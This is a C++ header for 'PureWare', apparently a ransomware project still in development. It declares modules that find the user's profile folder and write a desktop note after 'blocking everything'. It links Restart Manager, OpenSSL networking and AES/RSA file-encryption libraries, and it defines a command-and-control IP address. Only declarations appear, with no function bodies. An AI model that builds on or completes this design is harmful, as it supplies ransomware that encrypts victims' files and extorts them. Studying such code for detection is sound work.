#ifndef PUREWARE_PUREWARE_HPP_
#define PUREWARE_PUREWARE_HPP_

#pragma once
#pragma comment(lib, "Rstrtmgr.lib") // Linking Restart Manager
#pragma comment(lib, "ws2_32.lib") // Linking Winsock
#pragma comment(lib, "libssl.lib") // Linking OpenSSL
#pragma comment(lib, "libcrypto.lib") // Linking SSL/TLS cryptography
#pragma comment(lib, "cryptopp.lib") // Linking AES and RSA cryptography

#include <spdlog/spdlog.h>
#include <spdlog/sinks/basic_file_sink.h>
#include <fstream>
#include <iostream>
#include <filesystem>
#include <Windows.h>
#include <restartmanager.h> // To check if files are in use by other processes
#include <winsock2.h> // For basic networking
#include <ws2tcpip.h> // For IP address translation
#include <openssl/ssl.h> // For SSL/TLS connections
#include <openssl/err.h> // For SSL/TLS error handling
#include <locale>
#include <shellapi.h>
#include <objbase.h>
#include <shlwapi.h> // PathCombineW, etc
#include <shlobj.h> // For FileModule FOLDERID_*
#include <cryptopp/rsa.h> // For RSA encryption-decryption
#include <cryptopp/osrng.h> // For crypto-secured random number generation
#include <cryptopp/aes.h> // For AES encryption-decryption
#include <cryptopp/modes.h> // For ciphers operations
#include <cryptopp/filters.h> // For ciphers management
#include <cryptopp/files.h> // For files encryption-decryption
#include <cryptopp/base64.h> // For base64 enryption-decryption

using path_t = std::filesystem::path;

class FileModule
{
public:
    void FindDirectory(); // Searches for the directory that we have rights to "C:\Users \{Username}\" and assign to the directory class variable
private:
    PWSTR directoryPath_; // The directory that the FindDirectory method will assign

};
// Block everything and create a desktop shity note // Надо дописать так, чтобы можно было кастомить
class NoteModule
{
    std::wstring Note_that_would_be_set_in_file;

    void Create_README_file(const path_t& README_path);
public:
    NoteModule();
    NoteModule(std::wstring Note_that_would_be_set_in_file);
    void NotifyUsersAboutWorkResults();
};

#define C2_IP_ADDRESS "192.168.255.254"

#endif // PUREWARE_PUREWARE_HPP_